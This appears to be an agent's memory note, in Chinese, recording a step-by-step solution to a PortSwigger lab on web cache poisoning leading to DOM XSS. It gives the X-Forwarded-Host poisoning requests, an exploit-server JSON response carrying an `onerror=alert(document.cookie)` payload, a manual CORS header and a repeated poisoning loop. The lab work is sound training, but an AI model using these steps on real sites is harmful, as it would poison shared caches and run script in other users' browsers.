---
metadata:
  node_type: memory
name: "PRS arm A lab-web-cache-poisoning-strict-cacheability-dom"
description: "arm A 基线:lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria 冷实例一次通过 - X-Forwarded-Host 反射进 data.host 投毒首页缓存后，被迫在 exploit server 响应头手加 ACAO:* 才能让受害者跨源读 JSON"
last_updated: 2026-10-09T11:56:12+08:00
created: 2026-10-09T11:56:12+08:00
---

## 题面与机制
- lab 路径 /web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria,实例 0a5c008103b212d481f7bce200c00000。
- 首页内联脚本 `data = {"host":"<请求 Host/X-Forwarded-Host>","path":"/"}`;`/resources/js/geolocate.js` 定义 `initGeoLocate(jsonUrl)`,首页末尾调用 `initGeoLocate('//' + data.host + '/resources/json/geolocate.json')`,sink = `div.innerHTML = 'Free shipping to ' + j.country`(DOM XSS)。

## 解法(一次通过)
1. `range_launch launch <lab_id> --jar /tmp/cj1.json`;首次返回 build_pending 静默(实际是 widget 里 “could not be started in a timely manner”),nap 30s 后同 jar 重射即得实例。
2. recon:`http_dump <root>`(首页 x-cache/age/cache-control: max-age=30),读 `/resources/js/geolocate.js` 与 `text_grep initGeoLocate /tmp/home.html` 定位 sink 与调用点。
3. 验证反射:`http_dump <root> --header 'X-Forwarded-Host: example.com'` → body `data.host=example.com`,x-cache miss;随后 plain GET → x-cache hit 且仍 example.com ⇒ 首页可投毒且缓存不按 cookie/Vary 分流。
4. exploit server:`http_session post <exploit>/ --form responseFile=/resources/json/geolocate.json --form 'responseHead=HTTP/1.1 200 OK\nContent-Type: application/json\nAccess-Control-Allow-Origin: *' --form 'responseBody={"country":"<img src=1 onerror=alert(document.cookie)>"}' --form formAction=STORE`。
5. 投毒:`http_dump <root> --header 'X-Forwarded-Host: exploit-....exploit-server.net'`;`poison_loop <root> --header 'X-Forwarded-Host: <exploit>' --interval-secs 10 --count 18` 持续保持 30s TTL 内投毒,等受害者每分钟访问一次;`banner_verdict` → solved:true + “Congratulations, you solved the lab!”。

## 关键坑
- exploit server 默认不给 CORS 头(实测裸响应只有 content-type/keep-alive/server;带 Origin 请求也不加),跨源 `fetch(...).then(r=>r.json())` 会被浏览器拦;必须在自己的 responseHead 手加 `Access-Control-Allow-Origin: *`(题解不写这一步,是本题真正的暗礁)。
- 本次 range_launch 首次“无实例”并非鉴权问题:cj1 jar 的 portswigger 会话有效,根因是 lab 环境冷构建超时,重射即成。

